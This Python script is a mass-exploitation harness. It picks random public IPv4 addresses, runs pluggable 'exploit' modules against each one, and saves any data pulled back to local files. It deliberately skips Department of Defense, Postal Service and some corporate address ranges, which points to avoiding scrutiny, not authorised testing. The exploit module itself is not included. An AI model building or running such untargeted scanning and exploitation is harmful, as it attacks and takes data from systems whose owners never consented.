import asyncio
import ipaddress
import random
import re
import time
from os import system, name
from x_modules import Test

method_list = [Test] # method_list = [Module1,Module2,Module3]


async def clear(): 
    if name == 'nt': 
        _ = system('cls')
    else: 
        _ = system('clear')


async def scrape_task(n, ip, method, counter, timeout=5):
    delay = random.uniform(0, 3)
    # delay = 0 ##### DEUGGING LINE - RESET/SKIP DELAY TIMER #####
    await asyncio.sleep(delay)
    content = await method.exploit(ip, timeout)
    if content != None:
        filename = f'scrape/data_{ip}.tmp'
        with open (filename, 'wb') as f: # Change from wb (write bytes) to w for str(content)
            f.write(content)
        counter.alive += 1
    else:
        # print("FAIL! Scrape task can't write file, content is empty!")
        counter.dead += 1
        return


async def get_block():
    block = []
    block_size = 30
    for i in range(0, block_size):
        while True:
            s1 = random.randint(0,255)
            s2 = random.randint(0,255)
            s3 = random.randint(0,255)
            s4 = random.randint(0,255)
            if not (s1 == 127 or                             # 127.0.0.0/8      - Loopback
                (s1 == 0) or                              # 0.0.0.0/8        - Invalid address space
                (s1 == 3) or                              # 3.0.0.0/8        - General Electric Company
                (s1 == 15 or s1 == 16) or                 # 15.0.0.0/7       - Hewlett-Packard Company
                (s1 == 56) or                             # 56.0.0.0/8       - US Postal Service
                (s1 == 10) or                             # 10.0.0.0/8       - Internal network
                (s1 == 192 and s2 == 168) or               # 192.168.0.0/16   - Internal network
                (s1 == 172 and s2 >= 16 and s2 < 32) or     # 172.16.0.0/14    - Internal network
                (s1 == 100 and s2 >= 64 and s2 < 127) or    # 100.64.0.0/10    - IANA NAT reserved
                (s1 == 169 and s2 > 254) or                # 169.254.0.0/16   - IANA NAT reserved
                (s1 == 198 and s2 >= 18 and s2 < 20) or     # 198.18.0.0/15    - IANA Special use
                (s1 >= 224) or                            # 224.*.*.*+       - Multicast
                (s1 == 6 or s1 == 7 or s1 == 11 or s1 == 21 or s1 == 22 or s1 == 26 or s1 == 28 or s1 == 29 or s1 == 30 or s1 == 33 or s1 == 55 or s1 == 214 or s1 == 215) # Department of Defense
                ):
                # print(ipaddress.IPv4Address(f'{s1}.{s2}.{s3}.{s4}'))
                # print("Good IP")
                block.append(f'{s1}.{s2}.{s3}.{s4}')
                break
            # else:
            #   print(ipaddress.IPv4Address(f'{s1}.{s2}.{s3}.{s4}'))
            #   print("Bad IP trying again")
    return block


async def main():
    t = time.perf_counter()
    counter = type('', (), {})()
    counter.alive = 0
    counter.dead = 0
    counter.timeout = 0
    block_count = 0
    while True:
        i = 0
        while i < len(method_list):
            await clear()
            block = await get_block()
            block_count += 1
            print(f'Block size: {len(block)}')
            print(f'Block count: {block_count}')
            print(f'Alive: {counter.alive}')
            print(f'Dead: {counter.dead}')
            if(counter.alive > 0):
                total = counter.alive + counter.dead
                rate = counter.alive / total * 100
                rate = round(rate, 3)
                print(f'Alive rate: {rate}%')

            method = method_list[i]
            print(f'Current method: ({i + 1}/{len(method_list)}) - {method}')
            t2 = time.perf_counter() - t
            print(f'Total duration: {t2:0.2f} seconds')
            print("Connections open: ", end='', flush=True)
            tasks = []
            for n, ip in enumerate(block):
                tasks.append(scrape_task(n, ip, method, counter))
            await asyncio.wait(tasks)
            i += 1


if __name__ == '__main__':
    asyncio.run(main())